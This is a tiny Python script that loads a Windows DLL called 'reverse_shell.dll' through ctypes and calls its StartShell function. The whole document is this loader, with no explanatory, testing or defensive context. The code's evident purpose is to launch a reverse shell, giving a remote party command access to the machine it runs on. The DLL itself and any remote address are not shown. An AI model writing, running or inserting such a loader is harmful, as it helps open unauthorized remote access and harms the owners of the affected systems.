import ctypes

# Load the DLL
shell_dll = ctypes.WinDLL("reverse_shell.dll")

# Call the exposed function
shell_dll.StartShell()